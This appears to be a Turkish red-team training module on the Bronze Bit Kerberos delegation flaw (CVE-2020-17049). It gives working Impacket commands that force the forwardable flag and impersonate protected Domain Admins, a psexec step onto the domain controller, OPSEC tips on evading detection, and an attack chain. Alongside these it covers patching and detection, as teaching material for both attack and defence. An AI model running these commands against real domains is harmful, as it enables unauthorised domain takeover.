## 1. Kavramsal Temel — Neden Var?

[06.2](./06.2_Constrained_Delegation_S4U.md) ve [06.3](./06.3_Resource_Based_Constrained_Delegation.md)'te bir savunma vardı: **"sensitive, cannot be delegated"** bayrağı veya **Protected Users** üyeliği olan hesaplar için S4U2Self'in ürettiği bilet **forwardable olmaz** → S4U2Proxy zinciri kırılır. Bronze Bit bu tek koruma kalkanını deler:

> **Bronze Bit (CVE-2020-17049), S4U2Self ile üretilen servis biletindeki `forwardable` bayrağını, saldırganın servis anahtarıyla (delegation hesabının hash'i) düzenlemesine izin veren bir kriptografik kusurdur. Bilet servis anahtarıyla şifreli olduğundan ve saldırgan o anahtara sahip olduğundan, forwardable bitini elle 1 yapıp S4U2Proxy'yi kandırır. Böylece "delege edilemez" işaretli Domain Admin'i bile impersonate eder.**

Kısacası: delegation'ın en son savunma çizgisini (sensitive/Protected Users) yamasız DC'lerde geçersiz kılar. Kasım 2020 yamasıyla ([Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md)) kapatıldı — ama yamasız DC'ler hâlâ bulunur.

**Analoji:** Constrained delegation zincirinin sonundaki "bu kişi delege EDİLEMEZ" mührü. Bronze Bit, mührün senin kalemin (servis anahtarı) ile yazıldığını fark eder → mührü silip "edilebilir" yazarsın; kapıdaki görevli (DC) sahte mührü kabul eder.

## 2. Teknik Derinlik — forwardable Bitinin Kırılması

### 2.1 S4U2Self biletinin şifrelemesi ve kusur

```
   S4U2Self çıktısı ST#1, delegation hesabının (svc-web) anahtarıyla şifrelidir.
   ST#1 içindeki flags alanında: forwardable biti (0x40000000)

   Yama ÖNCESİ:  DC, ST#1'in içeriğinin bütünlüğünü yalnızca şifreleme ile "varsayar";
                 servis anahtarına sahip saldırgan ST#1'i çözer → forwardable=1 yapar
                 → yeniden şifreler → S4U2Proxy'ye sunar → DC kabul eder.
   Yama SONRASI (CVE-2020-17049): DC, biletin forwardable durumunu ek doğrulamayla
                 kontrol eder → elle çevrilen bit reddedilir.
```

### 2.2 Neden servis anahtarı yeterli?

S4U2Self'te bilet, **delegasyonu yapan hesabın kendi anahtarıyla** (senin kontrol ettiğin svc-web/FAKE01$ hash'i) şifrelenir — çünkü bilet o hesaba geri döner. Sahip olduğun anahtarla şifreli bir şeyi çözüp değiştirebilirsin. Kusur, DC'nin bu "kendi kendine" bileti yeterince doğrulamamasıydı.

> **Pratik etki:** `getST -force-forwardable` (Impacket) bileti çözer, forwardable bitini set eder, yeniden paketler. Böylece:
> - "Account is sensitive and cannot be delegated" işaretli DA → impersonate edilebilir.
> - Protected Users üyesi hedef → (etype koşullarına bağlı) impersonate edilebilir.

### 2.2.1 Bronze Bit'in açtığı iki spesifik senaryo

```
   Senaryo A — S4U2Self forwardable vermeyen constrained ("Kerberos only", 06.2):
     Normalde keyfi kullanıcı impersonate edilemez. Bronze Bit forwardable'ı zorla set eder
     → "protocol transition olmayan" constrained delegation bile keyfi impersonation'a açılır.
   Senaryo B — "Account is sensitive and cannot be delegated" / Protected Users hedef:
     Normalde bu hesaplar için forwardable bilet gelmez. Bronze Bit ile forwardable=1
     → Domain Admin gibi korunmuş hesaplar impersonate edilir (yamasız DC'de).
```

### 2.3 AES/etype ve Protected Users nüansı

Protected Users üyeleri RC4 kullanamaz ve bilet ömrü kısadır; Bronze Bit'in etkisi etype'a göre değişebilir. En temiz senaryo delegation hesabının AES anahtarıyla (`-aesKey`) çalışmaktır — hem yama-öncesi kusuru tetikler hem etype anomalisinden kaçınır. Yama (KB4586786) her iki etype'ta da düzeltmeyi getirir.

### 2.4 Yama durumu tespiti

Bronze Bit yalnızca **yamasız** DC'lerde çalışır (Kasım 2020 öncesi güncelleme seviyesi). Modern ortamlar yamalıdır; yine de eski/ihmal edilmiş DC'ler veya izole ormanlar açık olabilir. `-force-forwardable` denendiğinde yamalı DC `KDC_ERR_BADOPTION` benzeri hata döndürür.

## 3. Pratik Uygulama

### 3.1 Impacket getST ile Bronze Bit

```bash
# Normal S4U (sensitive hedef → başarısız):
impacket-getST -spn CIFS/DC01.corp.local -impersonate administrator \
  -hashes :<svc-web NThash> corp.local/svc-web -dc-ip 10.10.10.5
#   → "administrator" sensitive ise forwardable gelmez → S4U2Proxy fail

# Bronze Bit ile forwardable'ı zorla (yamasız DC'de başarılı):
impacket-getST -spn CIFS/DC01.corp.local -impersonate administrator \
  -hashes :<svc-web NThash> -force-forwardable corp.local/svc-web -dc-ip 10.10.10.5
export KRB5CCNAME=administrator@CIFS_DC01.corp.local.ccache
impacket-psexec -k -no-pass corp.local/administrator@DC01.corp.local
```

### 3.1.1 Yama seviyesi ön kontrolü (denemeden önce)

```bash
# DC işletim/build bilgisini al (yama tahmini) — nxc veya nmap
nxc smb 10.10.10.5 -u jdoe -p 'Welcome1'    # OS build satırı
# Yamasız (2020-11 öncesi) ihtimali varsa dene; yamalıysa boş yere 4769 gürültüsü üretme.
# Yamalı DC yanıtı: S4U2Proxy KDC_ERR_BADOPTION / boş bilet → başarısız.
```

### 3.2 RBCD + Bronze Bit birleşimi

```bash
# RBCD (06.3) kurulmuş FAKE01$ ile, sensitive bir admin'i force-forwardable ile impersonate et
impacket-getST -spn CIFS/TARGET01.corp.local -impersonate 'protected-admin' \
  -force-forwardable corp.local/'FAKE01$':'FakePass123!' -dc-ip 10.10.10.5
```

**Örnek çıktı:**
```
[*] Requesting S4U2self
[*] Forcing the forwardable flag on the ticket (CVE-2020-17049)
[*] Requesting S4U2Proxy
[*] Saving ticket in protected-admin@CIFS_TARGET01.corp.local.ccache   ← sensitive hedef aşıldı
```

**OPSEC notları:**
- **Birincil savunma yama'dır** ([Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md)) — bu bir "yanlış yapılandırma" değil, bir **CVE**'dir. Yamalı DC'de teknik çalışmaz. Önce DC yama seviyesini tahmin et (build/işletim), yamasızsa dene; yamalı DC'de gereksiz `KDC_ERR` hataları iz bırakır.
- **En değerli senaryo:** Domain Admins genelde "sensitive/Protected Users"a alınır ([Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md)) — bu, S4U zincirlerinin normalde onları koruyacağı anlamına gelir. Bronze Bit tam da bu korumayı hedefler; yani yamasız bir ortamda "delegation + sensitive DA" kombinasyonu yanıltıcı bir güvenlik hissidir.
- **Anomali:** Bir delegation hesabının, "delege edilemez" işaretli bir kimlik için başarılı S4U2Proxy yapması mantıksızdır → savunmacı için güçlü sinyal. force-forwardable kullanımı 4769 desenini değiştirmez ama *sonucun imkânsızlığı* IOC'dir.
- Yama + Protected Users + delegation temizliği ([Blue M06](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/)) birlikte bu yolu tamamen kapatır.

---

### 4.1 Neden tespit "sonucun imkânsızlığı"dır?

Bronze Bit, ağda yeni bir olay türü üretmez — aynı 4769 S4U2Proxy olaylarını üretir. Ayırt edici olan **semantiktir**: 

```
   Normal:   delege edilebilir kullanıcı için S4U2Proxy başarılı → beklenen
   Bronze:   "cannot be delegated" işaretli kullanıcı için S4U2Proxy BAŞARILI → İMKANSIZ
   → Blue tarafı: "AccountNotDelegated=true olan bir hesap delegation biletiyle mi göründü?"
     korelasyonu kurar. Bu, olayın kendisinde değil, olayın olmaması gerektiğindedir.
```

Bu yüzden Bronze Bit tespiti, delegation envanteri ([Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md)) + hesap-koruma durumu bilgisini birleştirmeyi gerektirir; tek bir imza kuralı yetmez.

## 5. Doğrulama / Lab

```bash
# 1) Lab: yamasız (Kasım 2020 öncesi) DC + svc-web constrained delegation (CIFS/DC01)
# 2) administrator'ı "sensitive, cannot be delegated" yap
Set-ADAccountControl administrator -AccountNotDelegated $true
# 3) Normal getST → başarısız; -force-forwardable → başarılı (yamasız DC'de)
impacket-getST -spn CIFS/DC01.corp.local -impersonate administrator -force-forwardable -hashes :<hash> corp.local/svc-web
# 4) DC'yi yamala → aynı komutun artık başarısız olduğunu doğrula (savunma etkisi)
```

Atomic Red Team: **T1558** (delegation/ticket) → Blue doğrulaması [Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md).

### Gerçek-dünya Bronze Bit zinciri

```
   1) 06.3: WS042 üzerinde GenericWrite → FAKE01$ ile RBCD kuruldu
   2) Hedef 'tier0-adm' → "sensitive, cannot be delegated" işaretli (savunma önlemi)
   3) Normal getST → S4U2Proxy fail (forwardable yok)
   4) DC yama seviyesi kontrol → Kasım 2020 öncesi (yamasız!)
   5) getST -force-forwardable -impersonate tier0-adm FAKE01$ → başarılı
   6) tier0-adm olarak WS042'de SYSTEM → Tier 0 kimliği → Modül 09
   Savunmanın "sensitive" mührü, yamasız DC'de kâğıttan kaplan çıktı.
```

### Ek: kombine savunma neden gerekli?

```
   Sadece "sensitive/Protected Users"  → Bronze Bit (yamasız) deler
   Sadece yama                          → delegation yanlış yapılandırması hâlâ abuse edilir (06.2/06.3)
   Sadece delegation temizliği          → başka delegation hesabı bulunabilir
   → Katmanlı: YAMA + Protected Users + delegation envanteri/temizliği (Blue M06) birlikte kapatır.
```
